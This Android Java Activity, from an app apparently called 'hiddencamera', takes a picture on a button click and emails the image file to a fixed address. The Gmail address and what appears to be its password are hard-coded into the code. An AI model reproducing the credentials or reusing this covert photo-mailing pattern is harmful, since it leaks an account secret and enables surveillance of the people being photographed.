package com.hiddencamera;



import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class Main extends Activity {
 private String add="fkfkj";
 
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		Button b=(Button) findViewById(R.id.button1);
		final TextView tv= (TextView) findViewById(R.id.textView1);
		 final EditText et = (EditText) findViewById(R.id.editText1);
		 et.setText("start");
		b.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				 TakePicture T_P=new TakePicture();
				  try {   
	                	 GMailSender sender = new GMailSender("nazimawon@gmail.com", "N1107036");
	                	 add=T_P.pictureFile.toString();
	                	 //add="/mnt/sdcard/data.png";
	                	 sender.sendMail("This is Subject",   
	                            "This is Body",   
	                            "nazimawon@gmail.com",   
	                            "gazinazim1@gmail.com",add.trim());   
	                    et.setText("yes");
	                   
	                    et.setText(add);
	                } catch (Exception e) {   
	                    Log.e("SendMail", e.getMessage(), e);   
	                } 
				
				
			}
		});
	
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
